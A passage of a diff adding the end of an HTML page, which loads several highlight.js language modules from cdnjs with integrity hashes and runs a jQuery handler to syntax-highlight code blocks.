+    <script async crossorigin="anonymous" defer integrity="sha512-qtqDO052iXMSP+5d/aE/jMtL9vIIGvONgTJziC2K/ZIB1yEGa55WVxGE9/08rSQ62EoDifS9SWVGZ7ihSLhzMA==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/scss.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-1NmkjnEDnwwwcu28KoQF8vs3oaPFokQHbmbtwGhFfeDsQZtVFI8zW2aE9O8yMYdpdyKV/5blE4pSWw4Z/Sv97w==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/stylus.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-B2wSfruPjr8EJL6IIzQr1eAuDwrsfIfccNf/LCEdxELCgC/S/ZMt/Uvk80aD79m7IqOqW+Sw8nbkvha20yZpzg==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/swift.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-28oDiQZGKUVN6wQ7PSLPNipOcmkCALXKwOi7bnkyFf8QiMZQxG9EQoy/iiNx6Zxj2cG2SbVa4dXKigQhu7GiFw==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/yaml.min.js"></script>
+  
+
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+
+
+    
+  </body>
+</html>
+
